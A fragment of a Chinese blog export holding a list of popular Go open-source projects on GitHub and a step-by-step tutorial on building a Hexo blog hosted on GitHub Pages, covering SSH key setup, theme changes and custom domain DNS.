<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>介绍：<br>Docker项目在2014年9月份就拿到了C轮4000万美元融资，版本迭代速度超快，目前从GitHub看到已有78个版本，而它仅仅是再2013年初才正式开始的一个项目而已。目前，国内Docker技术推广也进行的如火如荼，比如 Docker中文社区，CSDN也建立了 Docker专区。CSDN CODE也将在近期与Docker中文社区合作，推出Docker技术文章翻译活动，届时也请大家多多关注，及时关注与参与。Docker团队之所以喜欢用Go语言，主要是Go具有强大的标准库、全开发环境、跨平台构建的能力。  </p>
<p>star数：52339<br>地址：<br><a href="https://github.com/moby/moby" target="_blank" rel="noopener">https://github.com/moby/moby</a>（Docker的新马甲）</p>
<h2 id="Kubernetes"><a href="#Kubernetes" class="headerlink" title="Kubernetes"></a>Kubernetes</h2><p>介绍：<br>Kubernetes是Google开源的一个容器编排引擎，它支持自动化部署、大规模可伸缩、应用容器化管理。在生产环境中部署一个应用程序时，通常要部署该应用的多个实例以便对应用请求进行负载均衡。在Kubernetes中，我们可以创建多个容器，每个容器里面运行一个应用实例，然后通过内置的负载均衡策略，实现对这一组应用实例的管理、发现、访问，而这些细节都不需要运维人员去进行复杂的手工配置和处理。  </p>
<p>star数：48830<br>地址：<br><a href="https://github.com/kubernetes/kubernetes" target="_blank" rel="noopener">https://github.com/kubernetes/kubernetes</a></p>
<h2 id="Lantern"><a href="#Lantern" class="headerlink" title="Lantern"></a>Lantern</h2><p>介绍：<br>蓝灯，翻墙利器。  </p>
<p>star数：40492<br>地址：<br><a href="https://github.com/getlantern/lantern" target="_blank" rel="noopener">https://github.com/getlantern/lantern</a></p>
<h2 id="Etcd"><a href="#Etcd" class="headerlink" title="Etcd"></a>Etcd</h2><p>介绍：<br>etcd是由CoreOS开发并维护键值存储系统，它使用Go语言编写，并通过Raft一致性算法处理日志复制以保证强一致性。目前，Google的容器集群管理系统Kubernetes、开源PaaS平台Cloud Foundry和CoreOS的Fleet都广泛使用了etcd。Fleet则是一个分布式的初始化系统。它们之所以选择使用Go语言，则是因为Go语言对跨平台的良好支持，以及其背后的强大社区。  </p>
<p>star数：23187<br>地址：<br><a href="https://github.com/etcd-io/etcd" target="_blank" rel="noopener">https://github.com/etcd-io/etcd</a></p>
<h2 id="InfluxDB"><a href="#InfluxDB" class="headerlink" title="InfluxDB"></a>InfluxDB</h2><p>介绍：<br>一个Go语音编写的开源分布式的时序、事件和指标数据库，无需外部依赖。其设计目标是实现分布式和水平伸缩扩展。  </p>
<p>star数：15681<br>地址：<br><a href="https://github.com/influxdata/influxdb" target="_blank" rel="noopener">https://github.com/influxdata/influxdb</a></p>
<h2 id="Hugo"><a href="#Hugo" class="headerlink" title="Hugo"></a>Hugo</h2><p>介绍：<br>一款极速的静态页面生成器，让你可以很快的搭建个人网站，提供了多套主题可供使用，并且可以自己定制，和NodeJS的Hexo是一样的。  </p>
<p>star数：33044<br>地址：<br><a href="https://github.com/gohugoio/hugo" target="_blank" rel="noopener">https://github.com/gohugoio/hugo</a></p>
<h2 id="Grafana"><a href="#Grafana" class="headerlink" title="Grafana"></a>Grafana</h2><p>介绍：<br>一款开源监控度量的看板系统，可以接Graphite,Elasticsearch,InfluxDB等数据源，定制化很高。  </p>
<p>star数：27027<br>地址：<br><a href="https://github.com/grafana/grafana" target="_blank" rel="noopener">https://github.com/grafana/grafana</a></p>
<h2 id="Codis"><a href="#Codis" class="headerlink" title="Codis"></a>Codis</h2><p>介绍：<br>Codis是一个分布式Redis解决方案,其实就是一个数据库代理，让你在使用Redis集群的时候，就像使用单机版的Redis是一样的，对开发者透明。  </p>
<p>star数：8840<br>地址：<br><a href="https://github.com/CodisLabs/codis" target="_blank" rel="noopener">https://github.com/CodisLabs/codis</a></p>
<h2 id="Gin-amp-Beego"><a href="#Gin-amp-Beego" class="headerlink" title="Gin &amp; Beego"></a>Gin &amp; Beego</h2><p>介绍：<br>两个快速开发Go应用的http框架，很好用很简洁，笔者亲测。  </p>
<p>star数：分别为24692和19086<br>地址：<br>分别为<a href="https://github.com/gin-gonic/gin" target="_blank" rel="noopener">https://github.com/gin-gonic/gin</a>和<a href="https://github.com/astaxie/beego" target="_blank" rel="noopener">https://github.com/astaxie/beego</a></p>
<h2 id="Prometheus"><a href="#Prometheus" class="headerlink" title="Prometheus"></a>Prometheus</h2><p>介绍：<br>Prometheus是一个开源监控系统，它前身是SoundCloud的警告工具包。从2012年开始，许多公司和组织开始使用Prometheus。该项目的开发人员和用户社区非常活跃，越来越多的开发人员和用户参与到该项目中。目前它是一个独立的开源项目，且不依赖与任何公司。为了强调这点和明确该项目治理结构，Prometheus在2016年继Kurberntes之后，加入了Cloud Native Computing Foundation。  </p>
<p>star数：22325<br>地址：<br><a href="https://github.com/prometheus/prometheus" target="_blank" rel="noopener">https://github.com/prometheus/prometheus</a></p>
<h2 id="Consul"><a href="#Consul" class="headerlink" title="Consul"></a>Consul</h2><p>介绍：<br>Consul 是 HashiCorp 公司推出的开源工具，用于实现分布式系统的服务发现与配置。与其他分布式服务注册与发现的方案，Consul的方案更“一站式”，内置了服务注册与发现框架、分布一致性协议实现、健康检查、Key/Value存储、多数据中心方案，不再需要依赖其他工具（比如ZooKeeper等）。  </p>
<p>star数：15040<br>地址：<br><a href="ttps://github.com/hashicorp/consul" target="_blank" rel="noopener">https://github.com/hashicorp/consul</a></p>
<h2 id="Nsq"><a href="#Nsq" class="headerlink" title="Nsq"></a>Nsq</h2><p>介绍：<br>NSQ是Go语言编写的，开源的分布式消息队列中间件，其设计的目的是用来大规模地处理每天数以十亿计级别的消息。NSQ 具有分布式和去中心化拓扑结构，该结构具有无单点故障、故障容错、高可用性以及能够保证消息的可靠传递的特征，是一个成熟的、已在大规模生成环境下应用的产品。  </p>
<p>star数：14559<br>地址：<br><a href="https://github.com/nsqio/nsq" target="_blank" rel="noopener">https://github.com/nsqio/nsq</a></p>
<h2 id="Awesome-go"><a href="#Awesome-go" class="headerlink" title="Awesome-go"></a>Awesome-go</h2><p>介绍：<br>这不是一个go项目，他是一个学习go的资料网站，属于著名的awesome系列，里面关于go的资源非常详细。  </p>
<p>star数：40465<br>地址：<br><a href="https://github.com/avelino/awesome-go" target="_blank" rel="noopener">https://github.com/avelino/awesome-go</a></p>
<h2 id="Open-falcon"><a href="#Open-falcon" class="headerlink" title="Open-falcon"></a>Open-falcon</h2><p>介绍：<br>越来越fashion的监控系统，小米开源。  </p>
<p>star数：4267<br>地址：<br><a href="https://github.com/open-falcon/falcon-plus" target="_blank" rel="noopener">https://github.com/open-falcon/falcon-plus</a></p>
<h2 id="Tidb"><a href="#Tidb" class="headerlink" title="Tidb"></a>Tidb</h2><p>介绍：<br>TiDB 是一个分布式 NewSQL 数据库。它支持水平弹性扩展、ACID 事务、标准 SQL、MySQL 语法和 MySQL 协议，具有数据强一致的高可用特性，是一个不仅适合 OLTP 场景还适合 OLAP 场景的混合数据库。    </p>
<p>star数：17508<br>地址：<br><a href="https://github.com/pingcap/tidb" target="_blank" rel="noopener">https://github.com/pingcap/tidb</a></p>
]]></content>
      <categories>
        <category>编程积累</category>
        <category>Go</category>
      </categories>
      <tags>
        <tag>Go</tag>
      </tags>
  </entry>
  <entry>
    <title>超详细的hexo+github page搭建.md</title>
    <url>/articles/d2a49991.html</url>
    <content><![CDATA[<h2 id="安装node-js"><a href="#安装node-js" class="headerlink" title="安装node.js"></a>安装node.js</h2><p>在 Windows 环境下安装 Node.js 非常简单，仅须到<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">官网下载</a>安装文件并执行即可完成安装，其中LTS是长期支持版，Current为最新版，但最新版一般都在开发阶段，还不稳定。建议选择LTS版本</p>
<p><img src="/articles/d2a49991/nodejs.png" alt></p>
<p>像我的是Windows 64位LTS，直接下载后执行，无脑下一步就行了，不需要配置环境变量。</p>
<a id="more"></a>

<h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><p>访问Git<a href="https://git-scm.com/download/" target="_blank" rel="noopener">官网</a>，下载对应系统的版本。</p>
<p><img src="/articles/d2a49991/git.png" alt="git"></p>
<p>这里选择windows, 下载完成后执行，一直下一步安装完毕。验证：通过在命令行输入 git version 查看是否安装成功，有输出版本号说明安装成功。</p>
<p><img src="/articles/d2a49991/git2.png" alt></p>
<p>因是windows图形界面，鼠标右键桌面菜单中就多了Git GUI Here和Git Bash Here两个按钮，一个是图形界面的Git操作，一个是命令行，我们选择Git Bash Here。</p>
<p><img src="/articles/d2a49991/git3.png" alt></p>
<h2 id="Hexo介绍"><a href="#Hexo介绍" class="headerlink" title="Hexo介绍"></a>Hexo介绍</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p>
<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>桌面右键鼠标，点击Git Bash Here，输入npm命令即可安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>第一句是安装hexo，第二句是安装hexo部署到gitpage的deployer依赖包，两个都需要安装。</p>
<p>创建Hexo文件夹<br>安装完成后，根据自己喜好建立目录（如F:\Blog\Hexo），直接进入F:\Blog\Hexo文件夹下右键鼠标，点击Git Bash Here，进入Git命令框，执行以下操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>

<p>安装 Hexo 完成后，Hexo 将会在指定文件夹中新建所需要的文件。Hexo文件夹下的目录如下： </p>
<p><img src="/articles/d2a49991/3.png" alt></p>
<p>本地查看效果<br>执行下面语句，执行完即可登录localhost:4000查看效果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>登录localhost:4000，即可看到本地的效果如下： </p>
<p><img src="/articles/d2a49991/hexo.png" alt></p>
<h2 id="部署到GitHub-Page上"><a href="#部署到GitHub-Page上" class="headerlink" title="部署到GitHub Page上"></a>部署到GitHub Page上</h2><p>那么现在本地的博客已经搭建起来了，但是我们只可以通过本地连接查看我们的博客。那么我们现在需要做的就是把本地的博客发布到服务器上，让别人也可以连接我们的博客，而Github Pages就帮我完成了这件事情。但是Github Pages的代码就是寄存在Github上面的。那么接下来我们需要在Github上面创建一个新的项目。</p>
<h3 id="一、注册github账户"><a href="#一、注册github账户" class="headerlink" title="一、注册github账户"></a>一、注册github账户</h3><p>访问<a href="https://github.com" target="_blank" rel="noopener">Github首页</a><br>点击右上角的 Sign Up，注册自己的账户</p>
<h3 id="二、创建代码库"><a href="#二、创建代码库" class="headerlink" title="二、创建代码库"></a>二、创建代码库</h3><p>注册完登陆后，我们就创建一个我们自己的Github Pages项目。点击New repository，按图中所示填写。</p>
<p><img src="/articles/d2a49991/github.png" alt></p>
<h3 id="三、配置SSH密钥"><a href="#三、配置SSH密钥" class="headerlink" title="三、配置SSH密钥"></a>三、配置SSH密钥</h3><p>配置Github的SSH密钥可以让本地git项目与远程的github建立联系，让我们在本地写了代码之后直接通过git操作就可以实现本地代码库与Github代码库同步。操作如下：</p>
<h4 id="第一步、看看是否存在SSH密钥-keys"><a href="#第一步、看看是否存在SSH密钥-keys" class="headerlink" title="第一步、看看是否存在SSH密钥(keys)"></a>第一步、看看是否存在SSH密钥(keys)</h4><p>首先，我们需要看看是否看看本机是否存在SSH keys,打开Git Bash,并运行:</p>
<p><code>$ cd ~/. ssh</code><br>检查你本机用户home目录下是否存在.ssh目录</p>
<p><img src="/articles/d2a49991/ssh.png" alt></p>
<p>如果，不存在此目录，则进行第二步操作，否则，你本机已经存在ssh公钥和私钥，可以略过第二步，直接进入第三步操作。</p>
<h4 id="第二步、创建一对新的SSH密钥-keys"><a href="#第二步、创建一对新的SSH密钥-keys" class="headerlink" title="第二步、创建一对新的SSH密钥(keys)"></a>第二步、创建一对新的SSH密钥(keys)</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">#这将按照你提供的邮箱地址，创建一对密钥</span><br><span class="line">Generating public/private rsa key pair.</span><br><span class="line">Enter file in which to save the key (/c/Users/you/.ssh/id_rsa): [Press enter]</span><br></pre></td></tr></table></figure>

<p>直接回车，则将密钥按默认文件进行存储。此时也可以输入特定的文件名，比如/c/Users/you/.ssh/github_rsa</p>
<p>接着，根据提示，你需要输入密码和确认密码（说到这里，如果你很放心，其实可以不用密码，就是到输密码的地方，都直接回车，所以每次push就只管回车就行了。所谓的最安全的密码，就是没有密码 哈哈）。相关提示如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter passphrase (empty for no passphrase): [Type a passphrase]</span><br><span class="line">Enter same passphrase again: [Type passphrase again]</span><br></pre></td></tr></table></figure>

<p>输入完成之后，屏幕会显示如下信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your identification has been saved in /c/Users/you/.ssh/id_rsa.</span><br><span class="line">Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db your_email@example.com</span><br></pre></td></tr></table></figure>

<h4 id="第三步、在GitHub账户中添加你的公钥"><a href="#第三步、在GitHub账户中添加你的公钥" class="headerlink" title="第三步、在GitHub账户中添加你的公钥"></a>第三步、在GitHub账户中添加你的公钥</h4><p>运行如下命令，将公钥的内容复制到系统粘贴板(clipboard)中，或者打开~/.ssh/id_rsa.pub后复制。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">clip &lt; ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>接着：</p>
<p>登陆GitHub,进入你的Account Settings.</p>
<p><img src="/articles/d2a49991/github2.png" alt></p>
<p>2.选择SSH Keys</p>
<p><img src="/articles/d2a49991/github3.png" alt></p>
<p>3.粘贴密钥，添加即可</p>
<p><img src="/articles/d2a49991/github4.png" alt></p>
<p><img src="/articles/d2a49991/github5.png" alt></p>
<h4 id="第四步、测试"><a href="#第四步、测试" class="headerlink" title="第四步、测试"></a>第四步、测试</h4><p>可以输入下面的命令，看看设置是否成功，<a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>的部分不要修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>

<p>如果是下面的反馈：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The authenticity of host &apos;github.com (207.97.227.239)&apos; can&apos;t be established.</span><br><span class="line">RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure>

<p>不要紧张，输入yes就好。</p>
<h4 id="第五步、设置用户信息"><a href="#第五步、设置用户信息" class="headerlink" title="第五步、设置用户信息"></a>第五步、设置用户信息</h4><p>现在你已经可以通过SSH链接到GitHub了，还有一些个人信息需要完善的。 Git会根据用户的名字和邮箱来记录提交。GitHub也是用这些信息来做权限的处理，输入下面的代码进行个人信息的设置，把名称和邮箱替换成你自己的，名字根据自己的喜好自己取，而不是GitHub的昵称。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name &quot;wandouduoduo&quot;//用户名</span><br><span class="line">$ git config --global user.email  &quot;wandouduoduo@163.com&quot;//填写自己的邮箱</span><br></pre></td></tr></table></figure>

<h4 id="第六步、SSH-Key配置成功"><a href="#第六步、SSH-Key配置成功" class="headerlink" title="第六步、SSH Key配置成功"></a>第六步、SSH Key配置成功</h4><p>本机已成功连接到github。</p>
<h3 id="四、将本地的Hexo文件更新到Github的库中"><a href="#四、将本地的Hexo文件更新到Github的库中" class="headerlink" title="四、将本地的Hexo文件更新到Github的库中"></a>四、将本地的Hexo文件更新到Github的库中</h3><p>第一步、登录Github打开自己的项目 username.github.io</p>
<p><img src="/articles/d2a49991/github6.png" alt></p>
<p>第二步、打开之后，点击SSH，选择SSH类型地址</p>
<p><img src="/articles/d2a49991/github7.png" alt></p>
<p>第三步、复制地址</p>
<p><img src="/articles/d2a49991/github8.png" alt></p>
<p>第四步、打开你一开始创建的Hexo文件夹（如E:\Blog\Hexo），用记事本打开刚文件夹下的_config.yml文件</p>
<p><img src="/articles/d2a49991/4.png" alt></p>
<p>第五步、在配置文件里作如下修改，保存</p>
<p><img src="/articles/d2a49991/5.png" alt></p>
<p>第六步、在Hexo文件夹下执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>或者直接执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

<p>执行完之后会让你输入github的账号和密码，输入完后就可以登录我们自己的部署在Github Pages服务器上的博客了。对应的地址是 username.github.io(我的是：wandouduoduo.github.io)。</p>
<p>假如这时候，报错 ERROR Deployer not found: git，那么就是你的deployer没有安装成功，你需要执行如下命令再安装一次：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>这样，你再执行hexo g -d，你的博客就部署到Github上了。</p>
<p>第七步、在浏览器上输入自己的主页地址<br>在浏览器上输入Github Pager为我们生成的外链（例如我的是：<a href="https://wandouduoduo.github.io，而你的只需要把你的github用户名替换掉这个链接中的wandouduoduo，因为我的用户名是这个）即可看到自己的博客了。" target="_blank" rel="noopener">https://wandouduoduo.github.io，而你的只需要把你的github用户名替换掉这个链接中的wandouduoduo，因为我的用户名是这个）即可看到自己的博客了。</a></p>
<p>当然，每一个人都可以通过这个地址访问到你的博客了。</p>
<p><img src="/articles/d2a49991/6.png" alt></p>
<h2 id="美化自己博客"><a href="#美化自己博客" class="headerlink" title="美化自己博客"></a>美化自己博客</h2><p>那么现在我们的博客已经挂在了Github服务器上面，别人已经可以通过地址来登陆我们的博客了，但是我们这时就有了新的需求，就是自己的博客并不好看，那怎么办的？这很简单，要知道很多前端开发者在Hexo框架下开发了很多的主题给我们使用，我们只需要把他们的主题克隆过来，然后通过修改配置文件即可达到我们所需要的效果。</p>
<p>那么我们应该怎么修改呢？</p>
<p>一、进入<a href="https://hexo.io/themes/" target="_blank" rel="noopener">Hexo的官网主题专栏</a></p>
<p><img src="/articles/d2a49991/1.png" alt></p>
<p>二、挑选我们喜欢的主题<br>可以看到有很多主题给我们选，我们只要选择喜欢的主题点击进去，然后进入到它的github地址，我们只要把这个地址复制下来(例如我是选择：hexo-theme-next这个主题)</p>
<p><img src="/articles/d2a49991/2.png" alt></p>
<p>三、克隆主题<br>再打开Hexo文件夹下的themes目录（E:\Blog\hexo\themes），右键Git Bash，在命令行输入命令下载:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next(此处地址替换成你需要使用的主题的地址)</span><br></pre></td></tr></table></figure>

<p>四、修改Hexo配置文件<br>下载完成后，打开Hexo文件夹下的配置文件_config.yml</p>
<p>修改参数为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme: hexo-theme-next</span><br></pre></td></tr></table></figure>

<p>五、部署主题，本地查看效果<br>返回Hexo目录，右键Git Bash，输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p>打开浏览器，输入 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 即可看见我们的主题已经更换了。</p>
<p><img src="/articles/d2a49991/7.png" alt></p>
<p>六、如果效果满意，将它部署到Github上<br>打开Hexo文件夹，右键Git Bash，输入</p>
<p>hexo clean   (必须要，不然有时因为缓存问题，服务器更新不了主题)<br>hexo g -d</p>
<p>七、打开自己的主页，即可看到修改后的效果<br>更多修改效果请查看对应主题的说明文档，点击此查看本主题(Next)对应的说明文档。</p>
<h2 id="在博客写文章"><a href="#在博客写文章" class="headerlink" title="在博客写文章"></a>在博客写文章</h2><h3 id="一、用hexo发表新文章"><a href="#一、用hexo发表新文章" class="headerlink" title="一、用hexo发表新文章"></a>一、用hexo发表新文章</h3><p>`</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo n &quot;文章标题&quot;</span><br></pre></td></tr></table></figure>

<p>其中 我的家 为文章标题，执行命令 hexo n “我的家” 后，会在项目 \Hexo\source_posts 中生成 我的家.md文件，用编辑器打开编写即可。</p>
<p>当然，也可以直接在\Hexo\source_posts中新建一个md文件，我就是这么做的。 写完后，推送到服务器上，执行以下命令即可在我们的站点看到新的文章。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo g #生成</span><br><span class="line">$ hexo d #部署 # 可与hexo g合并为 hexo d -g</span><br></pre></td></tr></table></figure>

<h3 id="二、用Markdown写文章"><a href="#二、用Markdown写文章" class="headerlink" title="二、用Markdown写文章"></a>二、用Markdown写文章</h3><p>我们注意到在 \Hexo\source_posts 文件夹下存放着我们的文章，它们的格式都是以.md格式结尾的，没错，Hexo也是支持Markdown语法的，所以当我们需要写具有格式化的文章时，我们可以使用支持Markdown语法的编辑器进行文章编译，然后保存文件到 \Hexo\source_posts 文件夹下即可。</p>
<p><img src="/articles/d2a49991/8.png" alt></p>
<p>复制进去之后，只要执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>

<p>推送到我们的Github仓库即可。</p>
<p>那么什么是Markdown？<br>Markdown 是一种轻量级的「标记语言」，它的优点很多，目前也被越来越多的写作爱好者，撰稿者广泛使用。看到这里请不要被「标记」、「语言」所迷惑，Markdown 的语法十分简单。常用的标记符号也不超过十个，这种相对于更为复杂的HTML 标记语言来说，Markdown 可谓是十分轻量的，学习成本也不需要太多，且一旦熟悉这种语法规则，会有一劳永逸的效果。</p>
<p>Markdown有什么优点？<br>专注你的文字内容而不是排版样式。<br>轻松的导出 HTML、PDF 和本身的 .md 文件。<br>纯文本内容，兼容所有的文本编辑器与字处理软件。<br>可读，直观。适合所有人的写作语言。<br>我该用什么工具？<br>Windows下可以使用 MarkdownPad2。<br>在 Mac OS X 上，我建议你用 Mou 这款免费且十分好用的 Markdown 编辑器。<br>Web 端上，我强烈推荐 简书 这款产品。<br>关于Markdown的更多资料可以查看如下：</p>
<p><a href="https://sspai.com/post/25137" target="_blank" rel="noopener">认识与入门 Markdown</a><br><a href="https://www.douban.com/note/350126154/?type=like" target="_blank" rel="noopener">Markdown入门指南</a></p>
<h2 id="将自己的域名关联到Github-Pages上"><a href="#将自己的域名关联到Github-Pages上" class="headerlink" title="将自己的域名关联到Github Pages上"></a>将自己的域名关联到Github Pages上</h2><p>很多朋友创建了自己的博客之后会选择买一个属于自己的域名，然后将自己域名绑定到自己的Github Pages博客上，其实这也并不难，只要你有个域名。</p>
<h3 id="一、购买域名"><a href="#一、购买域名" class="headerlink" title="一、购买域名"></a>一、购买域名</h3><p>如果你不是很有钱，在<a href="https://wanwang.aliyun.com/domain/?spm=5176.383338.1907008.1.LWIFhw" target="_blank" rel="noopener">阿里云</a>上，你只要几块钱就可以买到一个域名。</p>
<p>选择你喜欢的域名，然后购买即可。</p>
<p><img src="/articles/d2a49991/9.png" alt></p>
<h3 id="二、配置CNAME文件"><a href="#二、配置CNAME文件" class="headerlink" title="二、配置CNAME文件"></a>二、配置CNAME文件</h3><p>在 \hexo\source 文件夹下创建文件 CNAME （新建记事本文件命名CNAME，然后打开）</p>
<p>内容为你的域名</p>
<p><img src="/articles/d2a49991/10.png" alt></p>
<p>在Hexo文件夹提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g -d</span><br></pre></td></tr></table></figure>

<h3 id="三、修改DNS的DNS"><a href="#三、修改DNS的DNS" class="headerlink" title="三、修改DNS的DNS"></a>三、修改DNS的DNS</h3><p>1.如果你是在阿里云购买域名的话，请登录阿里云网站。打开个人中心，点击域名</p>
<p><img src="/articles/d2a49991/11.png" alt></p>
<p>2.选择管理</p>
<p><img src="/articles/d2a49991/12.png" alt></p>
<p>3.修改DNS为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f1g1ns2.dnspod.net </span><br><span class="line">f1g1ns1.dnspod.net</span><br></pre></td></tr></table></figure>

<p><img src="/articles/d2a49991/13.png" alt></p>
<h3 id="四、域名解析"><a href="#四、域名解析" class="headerlink" title="四、域名解析"></a>四、域名解析</h3><p>打开<a href="https://www.dnspod.cn/" target="_blank" rel="noopener">DNSPOD</a>，注册一个账户</p>
<p>点击添加域名，把你的域名添加进去，如无意外，添加完之后就是以下这个状态 </p>
<p><img src="/articles/d2a49991/14.png" alt></p>
<p>此时点击添加记录，添加两个记录，一个主机记录为@， 一个为www，而记录值都是填同一个，填你的博客主页对应的ip，添加完后如下。 </p>
<p><img src="/articles/d2a49991/15.png" alt></p>
<p>但是如何获取ip值呢？打开运行，输入cmd，打开命令窗口输入 ping 域名 ， 查看解析ip地址</p>
<p>将IP输入过去，然后会提示你到域名注册的地方修改DNS。等待生效，最迟72小时生效。即可通过你的域名浏览你的博客主页。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>按照上述操作，开始建立你自己的博客吧，还在等什么呢？用博客展现自己的能力和分享自己心得，你会交到很多志同道合的朋友和成就。</p>
]]></content>
      <categories>
        <category>运维技术</category>
        <category>服务部署</category>
      </categories>
      <tags>
        <tag>Git</tag>
        <tag>Hexo</tag>
      </tags>
  </entry>
</search>
